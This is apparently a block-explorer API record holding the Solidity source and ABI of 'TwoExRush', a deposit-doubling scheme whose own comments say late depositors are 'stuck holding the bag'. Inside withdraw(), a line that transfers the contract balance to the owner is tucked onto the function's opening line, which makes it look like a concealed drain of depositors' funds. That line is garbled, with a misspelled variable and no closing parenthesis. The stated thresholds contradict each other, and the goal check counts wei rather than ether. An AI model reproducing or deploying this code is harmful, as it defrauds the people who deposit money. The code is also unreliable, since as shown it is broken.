{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.18;\r\n\r\n/*\r\nTWO EX RUSH!\r\nReceive 2x your deposit only after the contract reaches 10 ETH.\r\nThe first to withdraw after the 20 ETH is hit wins, the others are stuck holding the bag.\r\n\r\nAnti Whale: If you withdraw() and there is not enough ether in the contract to 2x your deposit,\r\n            then the transaction fails. This prevents whales and encourages smaller deposits.\r\n            i.e: Deposit 1ETH, withdraw() with 1.8 in the contract and it will fail.\r\n*/\r\n\r\ncontract TwoExRush {\r\n\r\n\tstring constant public name = \"TwoExRush\";\r\n\taddress owner;\r\n\taddress sender;\r\n\tuint256 withdrawAmount;\r\n\tuint256 contractATH;\r\n\tuint256 contractBalance;\r\n\r\n\tmapping(address => uint256) internal balance;\r\n\r\n    function TwoExRush() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Require goal to be met before allowing anyone to withdraw.\r\n\tfunction withdraw() public {owner.transfer(contractBalancer\n\t    if(contractATH >= 20) {\r\n\t        sender = msg.sender;\r\n\t        withdrawAmount = mul(balance[sender], 2);\r\n\t \t    sender.transfer(withdrawAmount);\r\n\t        contractBalance -= balance[sender];\r\n\t        balance[sender] = 0;\r\n\t    }\r\n\t}\r\n\r\n\tfunction deposit() public payable {\r\n \t    sender = msg.sender;\r\n\t    balance[sender] += msg.value;\r\n\t    contractATH += msg.value;\r\n\t    contractBalance += msg.value;\r\n\t}\r\n\r\n\tfunction () payable public {\r\n\t\tif (msg.value > 0) {\r\n\t\t\tdeposit();\r\n\t\t} else {\r\n\t\t\twithdraw();\r\n\t\t}\r\n\t}\r\n\t\r\n    // Safe Math\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"TwoExRush","CompilerVersion":"v0.4.18+commit.9cf6e910","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://3df8a75f7f6b47d7fbb836754bccb47b6a3ed4a4618b43e5fbd7a310f741ba6d"}]}